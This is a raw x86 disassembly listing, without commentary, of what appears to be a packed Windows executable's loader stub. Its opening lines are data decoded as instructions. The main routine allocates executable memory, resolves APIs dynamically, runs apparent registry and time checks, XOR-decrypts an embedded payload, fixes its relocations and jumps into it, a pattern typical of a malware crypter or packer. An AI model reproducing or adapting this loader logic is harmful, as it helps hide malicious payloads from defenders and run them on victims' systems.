  41ba0e:	loopne 0x41ba51
  41ba10:	add    BYTE PTR [eax+eiz*8+0x41],cl
  41ba14:	add    BYTE PTR [eax-0x20],dl
  41ba17:	inc    ecx
  41ba18:	add    ah,bl
  41ba1a:	fild   WORD PTR [ecx+0x0]
  41ba1d:	push   esp
  41ba1e:	loopne 0x41ba61
  41ba20:	add    BYTE PTR [ebx*8-0x1fa7ffbf],bl
  41ba27:	inc    ecx
  41ba28:	add    ah,al
  41ba2a:	fld    QWORD PTR [ecx+0x0]
  41ba2d:	xchg   esp,eax
  41ba2e:	fiadd  WORD PTR [ecx+0x0]
  41ba31:	pop    esp
  41ba32:	loopne 0x41ba75
  41ba34:	add    BYTE PTR [eax-0x20],ah
  41ba37:	inc    ecx
  41ba38:	add    BYTE PTR [eax+eiz*8+0x41],ah
  41ba3c:	add    BYTE PTR [eax-0x20],ch
  41ba3f:	inc    ecx
  41ba40:	add    BYTE PTR [eax+eiz*8+0x41],ch
  41ba44:	add    BYTE PTR [eax-0x20],dh
  41ba47:	inc    ecx
  41ba48:	add    BYTE PTR [eax-0x23],al
  41ba4b:	inc    ecx
  41ba4c:	add    BYTE PTR [eax+eiz*8+0x41],dh
  41ba50:	add    BYTE PTR [eax-0x20],bh
  41ba53:	inc    ecx
  41ba54:	add    BYTE PTR [eax+eiz*8+0x41],bh
  41ba58:	add    BYTE PTR [eax-0x7bffbe20],al
  41ba5e:	loopne 0x41baa1
  41ba60:	add    BYTE PTR [eax-0x73ffbe20],cl
  41ba66:	loopne 0x41baa9
  41ba68:	add    BYTE PTR [ebp+ebx*8+0x41],ah
  41ba6c:	add    BYTE PTR [eax-0x6bffbe20],dl
  41ba72:	loopne 0x41bab5
  41ba74:	add    BYTE PTR [eax-0x53ffbe20],bl
  41ba7a:	fiadd  WORD PTR [ecx+0x0]
  41ba7d:	pushf  
  41ba7e:	loopne 0x41bac1
  41ba80:	add    BYTE PTR [eax+0x780041e0],ah
  41ba86:	fld    QWORD PTR [ecx+0x0]
  41ba89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba8a:	loopne 0x41bacd
  41ba8c:	add    BYTE PTR [eax-0x22],dl
  41ba8f:	inc    ecx
  41ba90:	add    BYTE PTR [eax-0x53ffbe20],ch
  41ba96:	loopne 0x41bad9
  41ba98:	add    BYTE PTR [eax-0x4bffbe20],dh
  41ba9e:	loopne 0x41bae1
  41baa0:	add    BYTE PTR [eax-0x43ffbe20],bh
  41baa6:	loopne 0x41bae9
  41baa8:	add    BYTE PTR [eax-0x3fffbe23],dl
  41baae:	loopne 0x41baf1
  41bab0:	add    BYTE PTR [edi+ebx*8-0x1f3bffbf],bh
  41bab7:	inc    ecx
  41bab8:	add    al,cl
  41baba:	loopne 0x41bafd
  41babc:	add    BYTE PTR [eax],dl
  41babe:	fld    QWORD PTR [ecx+0x0]
  41bac1:	int3   
  41bac2:	loopne 0x41bb05
  41bac4:	add    BYTE PTR [edi+ebx*8],bh
  41bac7:	inc    ecx
  41bac8:	add    al,dl
  41baca:	loopne 0x41bb0d
  41bacc:	add    ah,dl
  41bace:	loopne 0x41bb11
  41bad0:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41bad4:	add    BYTE PTR [eax-0x27ffbe20],ch
  41bada:	loopne 0x41bb1d
  41badc:	add    ah,bl
  41bade:	loopne 0x41bb21
  41bae0:	add    ah,cl
  41bae2:	int3   
  41bae3:	int3   
  41bae4:	int3   
  41bae5:	int3   
  41bae6:	int3   
  41bae7:	int3   
  41bae8:	int3   
  41bae9:	int3   
  41baea:	int3   
  41baeb:	int3   
  41baec:	int3   
  41baed:	int3   
  41baee:	int3   
  41baef:	int3   
  41baf0:	push   ebp
  41baf1:	mov    ebp,esp
  41baf3:	push   ecx
  41baf4:	mov    DWORD PTR [ebp-0x4],0x1e4dc
  41bafb:	push   0x40
  41bafd:	push   0x3000
  41bb02:	mov    eax,DWORD PTR [ebp+0x8]
  41bb05:	push   eax
  41bb06:	push   0x0
  41bb08:	call   DWORD PTR ds:0x41dcf0
  41bb0e:	mov    esp,ebp
  41bb10:	pop    ebp
  41bb11:	ret    
  41bb12:	int3   
  41bb13:	int3   
  41bb14:	int3   
  41bb15:	int3   
  41bb16:	int3   
  41bb17:	int3   
  41bb18:	int3   
  41bb19:	int3   
  41bb1a:	int3   
  41bb1b:	int3   
  41bb1c:	int3   
  41bb1d:	int3   
  41bb1e:	int3   
  41bb1f:	int3   
  41bb20:	push   ebp
  41bb21:	mov    ebp,esp
  41bb23:	pop    ebp
  41bb24:	ret    
  41bb25:	int3   
  41bb26:	int3   
  41bb27:	int3   
  41bb28:	int3   
  41bb29:	int3   
  41bb2a:	int3   
  41bb2b:	int3   
  41bb2c:	int3   
  41bb2d:	int3   
  41bb2e:	int3   
  41bb2f:	int3   
  41bb30:	push   ebp
  41bb31:	mov    ebp,esp
  41bb33:	sub    esp,0x8
  41bb36:	mov    eax,DWORD PTR [ebp+0x8]
  41bb39:	mov    DWORD PTR [ebp-0x4],eax
  41bb3c:	mov    ecx,DWORD PTR [ebp+0xc]
  41bb3f:	mov    DWORD PTR [ebp-0x8],ecx
  41bb42:	mov    edx,DWORD PTR [ebp-0x4]
  41bb45:	cmp    edx,DWORD PTR [ebp-0x8]
  41bb48:	jae    0x41bb51
  41bb4a:	mov    eax,DWORD PTR [ebp-0x4]
  41bb4d:	jmp    0x41bb54
  41bb4f:	jmp    0x41bb54
  41bb51:	mov    eax,DWORD PTR [ebp-0x8]
  41bb54:	mov    esp,ebp
  41bb56:	pop    ebp
  41bb57:	ret    
  41bb58:	int3   
  41bb59:	int3   
  41bb5a:	int3   
  41bb5b:	int3   
  41bb5c:	int3   
  41bb5d:	int3   
  41bb5e:	int3   
  41bb5f:	int3   
  41bb60:	push   ebp
  41bb61:	mov    ebp,esp
  41bb63:	push   ecx
  41bb64:	push   0x41d000
  41bb69:	push   0x41d018
  41bb6e:	call   DWORD PTR ds:0x41dcf4
  41bb74:	push   eax
  41bb75:	call   DWORD PTR ds:0x41db60
  41bb7b:	mov    DWORD PTR [ebp-0x4],eax
  41bb7e:	push   0x104
  41bb83:	push   0x420e58
  41bb88:	call   DWORD PTR [ebp-0x4]
  41bb8b:	push   0x41d024
  41bb90:	push   0x420e58
  41bb95:	call   DWORD PTR ds:0x41dcf8
  41bb9b:	mov    DWORD PTR ds:0x420f5c,0x401004
  41bba5:	mov    esp,ebp
  41bba7:	pop    ebp
  41bba8:	ret    
  41bba9:	int3   
  41bbaa:	int3   
  41bbab:	int3   
  41bbac:	int3   
  41bbad:	int3   
  41bbae:	int3   
  41bbaf:	int3   
  41bbb0:	push   ebp
  41bbb1:	mov    ebp,esp
  41bbb3:	mov    DWORD PTR ds:0x420f5c,0x41ac90
  41bbbd:	pop    ebp
  41bbbe:	ret    
  41bbbf:	int3   
  41bbc0:	push   ebp
  41bbc1:	mov    ebp,esp
  41bbc3:	mov    eax,DWORD PTR [ebp+0x8]
  41bbc6:	mov    eax,DWORD PTR [eax-0x4]
  41bbc9:	pop    ebp
  41bbca:	ret    
  41bbcb:	int3   
  41bbcc:	int3   
  41bbcd:	int3   
  41bbce:	int3   
  41bbcf:	int3   
  41bbd0:	push   ebp
  41bbd1:	mov    ebp,esp
  41bbd3:	sub    esp,0xc
  41bbd6:	mov    DWORD PTR [ebp-0x4],0x0
  41bbdd:	jmp    0x41bbe8
  41bbdf:	mov    eax,DWORD PTR [ebp-0x4]
  41bbe2:	add    eax,0x1
  41bbe5:	mov    DWORD PTR [ebp-0x4],eax
  41bbe8:	mov    ecx,DWORD PTR [ebp-0x4]
  41bbeb:	cmp    ecx,DWORD PTR [ebp+0x8]
  41bbee:	jae    0x41bc3f
  41bbf0:	mov    edx,DWORD PTR [ebp-0x4]
  41bbf3:	mov    eax,DWORD PTR [ebp+0xc]
  41bbf6:	movzx  ecx,WORD PTR [eax+edx*2]
  41bbfa:	sar    ecx,0xc
  41bbfd:	cmp    ecx,0x3
  41bc00:	jne    0x41bc3d
  41bc02:	mov    DWORD PTR [ebp-0xc],0xfff
  41bc09:	mov    edx,DWORD PTR [ebp-0x4]
  41bc0c:	mov    eax,DWORD PTR [ebp+0xc]
  41bc0f:	movzx  ecx,WORD PTR [eax+edx*2]
  41bc13:	and    ecx,DWORD PTR [ebp-0xc]
  41bc16:	add    ecx,0x43
  41bc19:	mov    DWORD PTR [ebp-0x8],ecx
  41bc1c:	mov    edx,DWORD PTR [ebp+0x18]
  41bc1f:	mov    eax,DWORD PTR [ebp+0x10]
  41bc22:	add    eax,DWORD PTR [edx]
  41bc24:	mov    ecx,DWORD PTR [ebp-0x8]
  41bc27:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  41bc2b:	add    edx,DWORD PTR [ebp+0x14]
  41bc2e:	mov    eax,DWORD PTR [ebp+0x18]
  41bc31:	mov    ecx,DWORD PTR [ebp+0x10]
  41bc34:	add    ecx,DWORD PTR [eax]
  41bc36:	mov    eax,DWORD PTR [ebp-0x8]
  41bc39:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  41bc3d:	jmp    0x41bbdf
  41bc3f:	mov    esp,ebp
  41bc41:	pop    ebp
  41bc42:	ret    
  41bc43:	int3   
  41bc44:	int3   
  41bc45:	int3   
  41bc46:	int3   
  41bc47:	int3   
  41bc48:	int3   
  41bc49:	int3   
  41bc4a:	int3   
  41bc4b:	int3   
  41bc4c:	int3   
  41bc4d:	int3   
  41bc4e:	int3   
  41bc4f:	int3   
  41bc50:	push   ebp
  41bc51:	mov    ebp,esp
  41bc53:	sub    esp,0x14
  41bc56:	mov    eax,DWORD PTR [ebp+0x8]
  41bc59:	cmp    DWORD PTR [eax+0x4],0x0
  41bc5d:	je     0x41bca7
  41bc5f:	mov    DWORD PTR [ebp-0x14],0x2a1
  41bc66:	mov    ecx,DWORD PTR [ebp+0x8]
  41bc69:	mov    edx,DWORD PTR [ecx+0x4]
  41bc6c:	sub    edx,0x8
  41bc6f:	shr    edx,1
  41bc71:	mov    DWORD PTR [ebp-0xc],edx
  41bc74:	mov    eax,DWORD PTR [ebp+0x8]
  41bc77:	add    eax,0x8
  41bc7a:	mov    DWORD PTR [ebp-0x10],eax
  41bc7d:	mov    ecx,DWORD PTR [ebp+0x8]
  41bc80:	push   ecx
  41bc81:	mov    edx,DWORD PTR [ebp+0x10]
  41bc84:	push   edx
  41bc85:	mov    eax,DWORD PTR [ebp+0xc]
  41bc88:	push   eax
  41bc89:	mov    ecx,DWORD PTR [ebp-0x10]
  41bc8c:	push   ecx
  41bc8d:	mov    edx,DWORD PTR [ebp-0xc]
  41bc90:	push   edx
  41bc91:	call   0x41bbd0
  41bc96:	add    esp,0x14
  41bc99:	mov    eax,DWORD PTR [ebp+0x8]
  41bc9c:	mov    ecx,DWORD PTR [ebp+0x8]
  41bc9f:	add    ecx,DWORD PTR [eax+0x4]
  41bca2:	mov    DWORD PTR [ebp+0x8],ecx
  41bca5:	jmp    0x41bc56
  41bca7:	mov    esp,ebp
  41bca9:	pop    ebp
  41bcaa:	ret    
  41bcab:	int3   
  41bcac:	int3   
  41bcad:	int3   
  41bcae:	int3   
  41bcaf:	int3   
  41bcb0:	push   ebp
  41bcb1:	mov    ebp,esp
  41bcb3:	sub    esp,0x24
  41bcb6:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bcbd:	mov    DWORD PTR [ebp-0x10],0x0
  41bcc4:	jmp    0x41bccf
  41bcc6:	mov    eax,DWORD PTR [ebp-0x10]
  41bcc9:	add    eax,0x4
  41bccc:	mov    DWORD PTR [ebp-0x10],eax
  41bccf:	mov    ecx,DWORD PTR [ebp-0x10]
  41bcd2:	cmp    ecx,DWORD PTR [ebp+0xc]
  41bcd5:	jae    0x41bd81
  41bcdb:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bce2:	cmp    DWORD PTR [ebp-0x10],0x0
  41bce6:	jne    0x41bd18
  41bce8:	push   0x0
  41bcea:	push   0x80
  41bcef:	push   0x3
  41bcf1:	push   0x0
  41bcf3:	push   0x3
  41bcf5:	push   0x1
  41bcf7:	push   0x420e58
  41bcfc:	call   DWORD PTR ds:0x41dcfc
  41bd02:	mov    DWORD PTR [ebp-0x4],eax
  41bd05:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  41bd09:	je     0x41bd11
  41bd0b:	cmp    DWORD PTR [ebp-0x4],0x0
  41bd0f:	jne    0x41bd18
  41bd11:	mov    eax,0x42
  41bd16:	jmp    0x41bd81
  41bd18:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bd1f:	mov    edx,DWORD PTR [ebp-0x10]
  41bd22:	add    edx,0x2a7
  41bd28:	mov    DWORD PTR ds:0x420f60,edx
  41bd2e:	mov    eax,DWORD PTR [ebp+0x8]
  41bd31:	add    eax,DWORD PTR [ebp-0x10]
  41bd34:	mov    ecx,DWORD PTR [eax]
  41bd36:	add    ecx,DWORD PTR [ebp-0x10]
  41bd39:	mov    edx,DWORD PTR [ebp+0x8]
  41bd3c:	add    edx,DWORD PTR [ebp-0x10]
  41bd3f:	mov    DWORD PTR [edx],ecx
  41bd41:	mov    eax,DWORD PTR [ebp-0xc]
  41bd44:	mov    DWORD PTR [ebp-0x14],eax
  41bd47:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41bd4e:	mov    ecx,DWORD PTR ds:0x420f60
  41bd54:	mov    DWORD PTR [ebp-0x24],ecx
  41bd57:	mov    edx,DWORD PTR [ebp-0x24]
  41bd5a:	mov    DWORD PTR [ebp-0x20],edx
  41bd5d:	mov    eax,DWORD PTR [ebp-0x20]
  41bd60:	mov    DWORD PTR [ebp-0x1c],eax
  41bd63:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd66:	mov    DWORD PTR [ebp-0x18],ecx
  41bd69:	mov    edx,DWORD PTR [ebp+0x8]
  41bd6c:	add    edx,DWORD PTR [ebp-0x10]
  41bd6f:	mov    eax,DWORD PTR [edx]
  41bd71:	xor    eax,DWORD PTR [ebp-0x18]
  41bd74:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd77:	add    ecx,DWORD PTR [ebp-0x10]
  41bd7a:	mov    DWORD PTR [ecx],eax
  41bd7c:	jmp    0x41bcc6
  41bd81:	mov    esp,ebp
  41bd83:	pop    ebp
  41bd84:	ret    
  41bd85:	int3   
  41bd86:	int3   
  41bd87:	int3   
  41bd88:	int3   
  41bd89:	int3   
  41bd8a:	int3   
  41bd8b:	int3   
  41bd8c:	int3   
  41bd8d:	int3   
  41bd8e:	int3   
  41bd8f:	int3   
  41bd90:	push   ebp
  41bd91:	mov    ebp,esp
  41bd93:	xor    eax,eax
  41bd95:	pop    ebp
  41bd96:	ret    0x10
  41bd99:	int3   
  41bd9a:	int3   
  41bd9b:	int3   
  41bd9c:	int3   
  41bd9d:	int3   
  41bd9e:	int3   
  41bd9f:	int3   
  41bda0:	push   ebp
  41bda1:	mov    ebp,esp
  41bda3:	sub    esp,0x2cc
  41bda9:	pusha  
  41bdaa:	mov    DWORD PTR ds:0x420f64,ebp
  41bdb0:	mov    DWORD PTR [ebp-0x29c],0x0
  41bdba:	push   0x41d040
  41bdbf:	push   0x41d050
  41bdc4:	call   DWORD PTR ds:0x41dcf4
  41bdca:	push   eax
  41bdcb:	call   DWORD PTR ds:0x41db60
  41bdd1:	mov    DWORD PTR [ebp-0x284],eax
  41bdd7:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  41bdde:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  41bde5:	lea    eax,[ebp-0x2b0]
  41bdeb:	push   eax
  41bdec:	lea    ecx,[ebp-0x2b4]
  41bdf2:	push   ecx
  41bdf3:	lea    edx,[ebp-0x8]
  41bdf6:	push   edx
  41bdf7:	call   DWORD PTR ds:0x41dd00
  41bdfd:	movzx  eax,WORD PTR [ebp-0x2b4]
  41be04:	cmp    eax,0x21
  41be07:	je     0x41be10
  41be09:	xor    eax,eax
  41be0b:	jmp    0x41c16a
  41be10:	lea    ecx,[ebp-0x260]
  41be16:	push   ecx
  41be17:	push   0x20019
  41be1c:	push   0x0
  41be1e:	push   0x420e54
  41be23:	push   0x80000002
  41be28:	call   DWORD PTR [ebp-0x284]
  41be2e:	test   eax,eax
  41be30:	je     0x41be39
  41be32:	xor    eax,eax
  41be34:	jmp    0x41c16a
  41be39:	lea    edx,[ebp-0x260]
  41be3f:	push   edx
  41be40:	push   0x20019
  41be45:	push   0x0
  41be47:	push   0x41d060
  41be4c:	mov    eax,DWORD PTR [ebp-0x260]
  41be52:	push   eax
  41be53:	call   DWORD PTR [ebp-0x284]
  41be59:	test   eax,eax
  41be5b:	je     0x41be64
  41be5d:	xor    eax,eax
  41be5f:	jmp    0x41c16a
  41be64:	lea    ecx,[ebp-0x260]
  41be6a:	push   ecx
  41be6b:	push   0x20019
  41be70:	push   0x0
  41be72:	push   0x41d110
  41be77:	mov    edx,DWORD PTR [ebp-0x260]
  41be7d:	push   edx
  41be7e:	call   DWORD PTR [ebp-0x284]
  41be84:	test   eax,eax
  41be86:	jne    0x41be8f
  41be88:	xor    eax,eax
  41be8a:	jmp    0x41c16a
  41be8f:	mov    DWORD PTR [ebp-0x21c],0x0
  41be99:	mov    DWORD PTR [ebp-0x290],0x64
  41bea3:	mov    DWORD PTR [ebp-0x224],0x15
  41bead:	mov    DWORD PTR [ebp-0x29c],0x0
  41beb7:	mov    DWORD PTR [ebp-0x25c],0x0
  41bec1:	mov    DWORD PTR [ebp-0x28c],0x1
  41becb:	mov    DWORD PTR [ebp-0x220],0x3
  41bed5:	call   0x41bb60
  41beda:	mov    eax,ds:0x420f5c
  41bedf:	push   eax
  41bee0:	call   0x41bbc0
  41bee5:	add    esp,0x4
  41bee8:	mov    DWORD PTR [ebp-0x2a0],eax
  41beee:	mov    ecx,DWORD PTR [ebp-0x2a0]
  41bef4:	push   ecx
  41bef5:	call   0x41baf0
  41befa:	add    esp,0x4
  41befd:	mov    DWORD PTR [ebp-0x298],eax
  41bf03:	mov    edx,DWORD PTR [ebp-0x2a0]
  41bf09:	push   edx
  41bf0a:	push   0x0
  41bf0c:	mov    eax,DWORD PTR [ebp-0x298]
  41bf12:	push   eax
  41bf13:	call   0x41bb20
  41bf18:	add    esp,0xc
  41bf1b:	mov    ecx,DWORD PTR [ebp-0x2a0]
  41bf21:	mov    DWORD PTR [ebp-0x2a8],ecx
  41bf27:	mov    edx,DWORD PTR [ebp-0x29c]
  41bf2d:	cmp    edx,DWORD PTR [ebp-0x2a0]
  41bf33:	jae    0x41bfbe
  41bf39:	mov    eax,DWORD PTR [ebp-0x2a8]
  41bf3f:	push   eax
  41bf40:	mov    ecx,DWORD PTR [ebp-0x290]
  41bf46:	push   ecx
  41bf47:	call   0x41bb30
  41bf4c:	add    esp,0x8
  41bf4f:	mov    DWORD PTR [ebp-0x2ac],eax
  41bf55:	mov    edx,DWORD PTR [ebp-0x2ac]
  41bf5b:	push   edx
  41bf5c:	mov    eax,ds:0x420f5c
  41bf61:	add    eax,DWORD PTR [ebp-0x25c]
  41bf67:	push   eax
  41bf68:	mov    ecx,DWORD PTR [ebp-0x298]
  41bf6e:	add    ecx,DWORD PTR [ebp-0x29c]
  41bf74:	push   ecx
  41bf75:	call   0x41cab6
  41bf7a:	add    esp,0xc
  41bf7d:	mov    edx,DWORD PTR [ebp-0x224]
  41bf83:	add    edx,DWORD PTR [ebp-0x290]
  41bf89:	add    edx,DWORD PTR [ebp-0x25c]
  41bf8f:	mov    DWORD PTR [ebp-0x25c],edx
  41bf95:	mov    eax,DWORD PTR [ebp-0x29c]
  41bf9b:	add    eax,DWORD PTR [ebp-0x290]
  41bfa1:	mov    DWORD PTR [ebp-0x29c],eax
  41bfa7:	mov    ecx,DWORD PTR [ebp-0x2a8]
  41bfad:	sub    ecx,DWORD PTR [ebp-0x2ac]
  41bfb3:	mov    DWORD PTR [ebp-0x2a8],ecx
  41bfb9:	jmp    0x41bf27
  41bfbe:	mov    edx,DWORD PTR [ebp-0x2a0]
  41bfc4:	push   edx
  41bfc5:	mov    eax,DWORD PTR [ebp-0x298]
  41bfcb:	push   eax
  41bfcc:	call   0x41bcb0
  41bfd1:	add    esp,0x8
  41bfd4:	mov    DWORD PTR [ebp-0x25c],0x0
  41bfde:	mov    DWORD PTR [ebp-0x2bc],0x0
  41bfe8:	call   0x41bbb0
  41bfed:	mov    ecx,DWORD PTR ds:0x420f5c
  41bff3:	push   ecx
  41bff4:	call   0x41bbc0
  41bff9:	add    esp,0x4
  41bffc:	mov    DWORD PTR [ebp-0x2c0],eax
  41c002:	mov    edx,DWORD PTR [ebp-0x2c0]
  41c008:	push   edx
  41c009:	call   0x41baf0
  41c00e:	add    esp,0x4
  41c011:	mov    DWORD PTR [ebp-0x258],eax
  41c017:	mov    eax,DWORD PTR [ebp-0x2c0]
  41c01d:	push   eax
  41c01e:	push   0x0
  41c020:	mov    ecx,DWORD PTR [ebp-0x258]
  41c026:	push   ecx
  41c027:	call   0x41bb20
  41c02c:	add    esp,0xc
  41c02f:	mov    edx,DWORD PTR [ebp-0x2c0]
  41c035:	mov    DWORD PTR [ebp-0x2c8],edx
  41c03b:	mov    eax,DWORD PTR [ebp-0x2bc]
  41c041:	cmp    eax,DWORD PTR [ebp-0x2c0]
  41c047:	jae    0x41c0d3
  41c04d:	mov    ecx,DWORD PTR [ebp-0x2c8]
  41c053:	push   ecx
  41c054:	mov    edx,DWORD PTR [ebp-0x290]
  41c05a:	push   edx
  41c05b:	call   0x41bb30
  41c060:	add    esp,0x8
  41c063:	mov    DWORD PTR [ebp-0x2cc],eax
  41c069:	mov    eax,DWORD PTR [ebp-0x2cc]
  41c06f:	push   eax
  41c070:	mov    ecx,DWORD PTR ds:0x420f5c
  41c076:	add    ecx,DWORD PTR [ebp-0x25c]
  41c07c:	push   ecx
  41c07d:	mov    edx,DWORD PTR [ebp-0x258]
  41c083:	add    edx,DWORD PTR [ebp-0x2bc]
  41c089:	push   edx
  41c08a:	call   0x41cab6
  41c08f:	add    esp,0xc
  41c092:	mov    eax,DWORD PTR [ebp-0x224]
  41c098:	add    eax,DWORD PTR [ebp-0x290]
  41c09e:	add    eax,DWORD PTR [ebp-0x25c]
  41c0a4:	mov    DWORD PTR [ebp-0x25c],eax
  41c0aa:	mov    ecx,DWORD PTR [ebp-0x2bc]
  41c0b0:	add    ecx,DWORD PTR [ebp-0x290]
  41c0b6:	mov    DWORD PTR [ebp-0x2bc],ecx
  41c0bc:	mov    edx,DWORD PTR [ebp-0x2c8]
  41c0c2:	sub    edx,DWORD PTR [ebp-0x2cc]
  41c0c8:	mov    DWORD PTR [ebp-0x2c8],edx
  41c0ce:	jmp    0x41c03b
  41c0d3:	mov    eax,DWORD PTR [ebp-0x2c0]
  41c0d9:	push   eax
  41c0da:	mov    ecx,DWORD PTR [ebp-0x258]
  41c0e0:	push   ecx
  41c0e1:	call   0x41bcb0
  41c0e6:	add    esp,0x8
  41c0e9:	mov    edx,DWORD PTR [ebp-0x298]
  41c0ef:	mov    eax,DWORD PTR [ebp-0x258]
  41c0f5:	mov    DWORD PTR [edx],eax
  41c0f7:	push   0x17000
  41c0fc:	call   0x41baf0
  41c101:	add    esp,0x4
  41c104:	mov    DWORD PTR [ebp-0xc],eax
  41c107:	push   0x15500
  41c10c:	mov    ecx,DWORD PTR [ebp-0x298]
  41c112:	push   ecx
  41c113:	mov    edx,DWORD PTR [ebp-0xc]
  41c116:	add    edx,0x200
  41c11c:	push   edx
  41c11d:	call   0x41cab6
  41c122:	add    esp,0xc
  41c125:	mov    eax,DWORD PTR [ebp-0xc]
  41c128:	sub    eax,0x400000
  41c12d:	push   eax
  41c12e:	mov    ecx,DWORD PTR [ebp-0xc]
  41c131:	push   ecx
  41c132:	mov    edx,DWORD PTR [ebp-0x258]
  41c138:	push   edx
  41c139:	call   0x41bc50
  41c13e:	add    esp,0xc
  41c141:	mov    esp,DWORD PTR ds:0x420f64
  41c147:	pop    eax
  41c148:	mov    eax,DWORD PTR [ebp-0xc]
  41c14b:	add    eax,0x15350
  41c150:	call   0x41c155
  41c155:	pop    ecx
  41c156:	call   0x41c15b
  41c15b:	pop    ecx
  41c15c:	call   0x41c161
  41c161:	pop    ecx
  41c162:	call   0x41c167
  41c167:	pop    ecx
  41c168:	jmp    eax
  41c16a:	mov    esp,ebp
  41c16c:	pop    ebp
  41c16d:	ret    
  41c16e:	jmp    DWORD PTR ds:0x41daac
  41c174:	jmp    DWORD PTR ds:0x41dab0
  41c17a:	jmp    DWORD PTR ds:0x41dab4
  41c180:	jmp    DWORD PTR ds:0x41dab8
  41c186:	jmp    DWORD PTR ds:0x41dabc
  41c18c:	jmp    DWORD PTR ds:0x41dac0
  41c192:	jmp    DWORD PTR ds:0x41dac4
  41c198:	jmp    DWORD PTR ds:0x41dac8
  41c19e:	jmp    DWORD PTR ds:0x41dacc
  41c1a4:	jmp    DWORD PTR ds:0x41dad0
  41c1aa:	jmp    DWORD PTR ds:0x41dad4
  41c1b0:	jmp    DWORD PTR ds:0x41dad8
  41c1b6:	jmp    DWORD PTR ds:0x41dadc
  41c1bc:	jmp    DWORD PTR ds:0x41dae0
  41c1c2:	jmp    DWORD PTR ds:0x41dae4
  41c1c8:	jmp    DWORD PTR ds:0x41dae8
  41c1ce:	jmp    DWORD PTR ds:0x41daec
  41c1d4:	jmp    DWORD PTR ds:0x41daf0
  41c1da:	jmp    DWORD PTR ds:0x41daf4
  41c1e0:	jmp    DWORD PTR ds:0x41daf8
  41c1e6:	jmp    DWORD PTR ds:0x41dafc
  41c1ec:	jmp    DWORD PTR ds:0x41db00
  41c1f2:	jmp    DWORD PTR ds:0x41db04
  41c1f8:	jmp    DWORD PTR ds:0x41db08
  41c1fe:	jmp    DWORD PTR ds:0x41db0c
  41c204:	jmp    DWORD PTR ds:0x41db10
  41c20a:	jmp    DWORD PTR ds:0x41db14
  41c210:	jmp    DWORD PTR ds:0x41db18
  41c216:	jmp    DWORD PTR ds:0x41db1c
  41c21c:	jmp    DWORD PTR ds:0x41db20
  41c222:	jmp    DWORD PTR ds:0x41db24
  41c228:	jmp    DWORD PTR ds:0x41db28
  41c22e:	jmp    DWORD PTR ds:0x41db2c
  41c234:	jmp    DWORD PTR ds:0x41db30
  41c23a:	jmp    DWORD PTR ds:0x41db34
  41c240:	jmp    DWORD PTR ds:0x41db38
  41c246:	jmp    DWORD PTR ds:0x41db3c
  41c24c:	jmp    DWORD PTR ds:0x41db40
  41c252:	jmp    DWORD PTR ds:0x41db44
  41c258:	jmp    DWORD PTR ds:0x41db48
  41c25e:	jmp    DWORD PTR ds:0x41db4c
  41c264:	jmp    DWORD PTR ds:0x41db50
  41c26a:	jmp    DWORD PTR ds:0x41db54
  41c270:	jmp    DWORD PTR ds:0x41db58
  41c276:	jmp    DWORD PTR ds:0x41db5c
  41c27c:	jmp    DWORD PTR ds:0x41db60
  41c282:	jmp    DWORD PTR ds:0x41db64
  41c288:	jmp    DWORD PTR ds:0x41db68
  41c28e:	jmp    DWORD PTR ds:0x41db6c
  41c294:	jmp    DWORD PTR ds:0x41db70
  41c29a:	jmp    DWORD PTR ds:0x41db74
  41c2a0:	jmp    DWORD PTR ds:0x41db78
  41c2a6:	jmp    DWORD PTR ds:0x41db7c
  41c2ac:	jmp    DWORD PTR ds:0x41db80
  41c2b2:	jmp    DWORD PTR ds:0x41db84
  41c2b8:	jmp    DWORD PTR ds:0x41db88
  41c2be:	jmp    DWORD PTR ds:0x41db8c
  41c2c4:	jmp    DWORD PTR ds:0x41db90
  41c2ca:	jmp    DWORD PTR ds:0x41db94
  41c2d0:	jmp    DWORD PTR ds:0x41db98
  41c2d6:	jmp    DWORD PTR ds:0x41db9c
  41c2dc:	jmp    DWORD PTR ds:0x41dba0
  41c2e2:	jmp    DWORD PTR ds:0x41dba4
  41c2e8:	jmp    DWORD PTR ds:0x41dba8
  41c2ee:	jmp    DWORD PTR ds:0x41dbac
  41c2f4:	jmp    DWORD PTR ds:0x41dbb0
  41c2fa:	jmp    DWORD PTR ds:0x41dbb4
  41c300:	jmp    DWORD PTR ds:0x41dbb8
  41c306:	jmp    DWORD PTR ds:0x41dbbc
  41c30c:	jmp    DWORD PTR ds:0x41dbc0
  41c312:	jmp    DWORD PTR ds:0x41dbc4
  41c318:	jmp    DWORD PTR ds:0x41dbc8
  41c31e:	jmp    DWORD PTR ds:0x41dbcc
  41c324:	jmp    DWORD PTR ds:0x41dbd0
  41c32a:	jmp    DWORD PTR ds:0x41dbd4
  41c330:	jmp    DWORD PTR ds:0x41dbd8
  41c336:	jmp    DWORD PTR ds:0x41dbdc
  41c33c:	jmp    DWORD PTR ds:0x41dbe0
  41c342:	jmp    DWORD PTR ds:0x41dbe4
  41c348:	jmp    DWORD PTR ds:0x41dbe8
  41c34e:	jmp    DWORD PTR ds:0x41dbec
  41c354:	jmp    DWORD PTR ds:0x41dbf0
  41c35a:	jmp    DWORD PTR ds:0x41dbf4
  41c360:	jmp    DWORD PTR ds:0x41dbf8
  41c366:	jmp    DWORD PTR ds:0x41dbfc
  41c36c:	jmp    DWORD PTR ds:0x41dc00
  41c372:	jmp    DWORD PTR ds:0x41dc04
  41c378:	jmp    DWORD PTR ds:0x41dc08
  41c37e:	jmp    DWORD PTR ds:0x41dc0c
  41c384:	jmp    DWORD PTR ds:0x41dc10
  41c38a:	jmp    DWORD PTR ds:0x41dc14
  41c390:	jmp    DWORD PTR ds:0x41dc18
  41c396:	jmp    DWORD PTR ds:0x41dc1c
  41c39c:	jmp    DWORD PTR ds:0x41dc20
  41c3a2:	jmp    DWORD PTR ds:0x41dc24
  41c3a8:	jmp    DWORD PTR ds:0x41dc28
